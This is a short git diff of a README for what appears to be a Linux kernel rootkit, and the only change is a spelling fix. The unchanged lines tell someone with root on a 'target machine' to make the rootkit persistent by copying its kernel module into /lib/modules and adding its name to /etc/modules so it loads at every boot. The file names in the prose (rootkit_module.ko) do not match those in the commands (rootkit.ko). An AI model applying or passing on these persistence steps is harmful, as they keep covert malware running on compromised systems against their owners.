@@ -25,7 +25,7 @@ cd bash-4.3
 make
 ```
 
-(extra) step 4: to make the rootkit persistant,  while root in the target machine, move rootkit_module.ko into the folder specified by /lib/modules/$(uname -r)/, and add the line "rootkit_module" to the bottom of /etc/modules. this make kmod load the module upon boot.
+(extra) step 4: to make the rootkit persistent,  while root in the target machine, move rootkit_module.ko into the folder specified by /lib/modules/$(uname -r)/, and add the line "rootkit_module" to the bottom of /etc/modules. this make kmod load the module upon boot.
 ```
 cp rootkit.ko /lib/modules/$(uname -r)/
 echo "rootkit" >> /etc/modules
